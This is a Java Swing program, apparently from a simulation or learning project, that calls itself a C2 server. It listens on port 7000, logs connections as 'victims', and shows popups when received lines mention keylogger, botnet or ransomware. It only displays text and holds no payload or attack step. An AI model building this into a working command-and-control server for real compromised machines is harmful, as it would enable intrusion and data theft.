import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Timer;
import java.util.TimerTask;

public class C2ServerGUI {
    private final int PORT = 7000;
    private JFrame frame;
    private JTextArea ta;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> new C2ServerGUI().start());
    }

    private void start() {
        frame = new JFrame("C2 Server (GUI)");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(700, 450);
        ta = new JTextArea();
        ta.setEditable(false);
        frame.add(new JScrollPane(ta), BorderLayout.CENTER);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);

        new Thread(this::runServer).start();
    }

    private void append(String s) {
        SwingUtilities.invokeLater(() -> ta.append(s + "\n"));
          DBLogger.log("C2Server", s, "INFO");
    }

    private void runServer() {
        try (ServerSocket ss = new ServerSocket(PORT)) {
            append("=== C2 Server === listening on port " + PORT);
            while (true) {
                Socket s = ss.accept();
                append("[C2] Victim connected: " + s.getInetAddress());
                BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    append("[C2] " + line);
                    String l = line.toLowerCase();
                    if (l.contains("keylogger") || l.contains("botnet") || l.contains("ransomware")) {  
			 final String copy = line;
                        SwingUtilities.invokeLater(() -> showPopup(copy));
                    }
                }
                append("[C2] Victim disconnected.");
                br.close();
                s.close();
            }
        } catch (IOException e) {
            append("[C2] error: " + e.getMessage());
        }
    }

	private void showPopup(String text) {
    JFrame f = new JFrame("C2 Update");
    f.setSize(520, 200);
    f.setAlwaysOnTop(true);
    f.setLocationRelativeTo(null);
    JTextArea ta2 = new JTextArea(text);
    ta2.setEditable(false);
    f.add(new JScrollPane(ta2));
    f.setVisible(true);
    new java.util.Timer().schedule(new java.util.TimerTask() {
        public void run() { f.dispose(); }
    }, 5000);
}


}

